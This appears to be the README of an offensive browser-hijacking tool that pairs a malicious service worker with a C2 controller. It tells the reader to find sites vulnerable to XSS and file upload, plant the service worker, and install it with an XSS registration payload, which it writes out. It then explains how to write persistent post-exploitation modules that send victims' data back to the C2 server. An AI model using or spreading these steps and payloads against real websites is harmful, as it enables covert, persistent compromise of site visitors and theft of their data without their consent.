# Welcome to SW-TOOL

## Info
This is just a alpha version. The proxying functions by and large is working fine. 
To setup:
1. run start.sh to:
	- startup the proxy on port 8888. Point your browser proxy to that
	- C2 Controller is listening on port 5000. This is the C@ service the SW communicates with
2. Find a vulnerable website with  XSS + fileupload
   - Upload C2_HOST/modules/sw.js
   - Use XSS to install the SW payload. Use either C2_HOST/modules/xss generater payload. For example, the payload would be:

```
navigator.serviceWorker.register('/PATH_TO_SW.js').then(function(s){
	setTimeout(function(){s.sync.register('outbox');s.sync.register('outbox2');s.sync.register('outbox3');s.sync.register('outbox4');Notification.requestPermission().then(function(){s.active.postMessage({'p':'1'})});}, 100);
});
```

To create a custom post-exploitation module:
1. Create a JS with the MODULE_FILENAME.js under: `app/templates/modules`
2. If you plan to use IndexedDB to save current status or for whatever reasons, you will need to wake up the DB with:
```
WriteIDB("MODULE_NAME_init", 1);
```
3. You then need to register the module within the main SW on the victim. In this way, if the SW goes inactive and wakes up again, the module will resume execution:
```
registerModule('MODULE_NAME');
```
4. If you need to read previous saved data in IndexedDB, use the following:
```
var MODULE_NAME_data;
new Promise((res, rej) => {
  ReadIDB("MODULE_NAME", rej);
}).catch(function(p){
  if(p == undefined){
    MODULE_NAME_data = 1; // DEFAULT value
  }else{
    MODULE_NAME_data = p; // previous value
  }
});
```
5. After the initialisation, define your module logic:
```
function MODULE_NAME_Logic(){
	// do stuff....
}
MODULE_NAME_Logic();   // if you need to read data from IndexedDB first, call this in the IDB Promise catch section after querying the value(s)
```
6. You can use the module API `sendModuleResultToC2` to send data to the C2:
```
sendModuleResultToC2('MODULE_NAME', `data_from_module`);
```
7. At the end, you will need to deregister the module from the main SW. This will ensure that if the SW wakes up again, the module will not run a second time.
```
function MODULE_NAME_Logic(){
	// do stuff....
	deregisterModule('MODULE_NAME');
}
```
8. As a starting point for your module please refer to a module template under `app/templates/modules/template.js`
9. Any results you send from the module will end up being visible on the dashboard under the agent that ran it
10. If you want to run the module again after it has already been executed, you can delete the module against the agent on the dashboard and execute it again

## License

This tool is released under the [MIT License](https://opensource.org/licenses/MIT).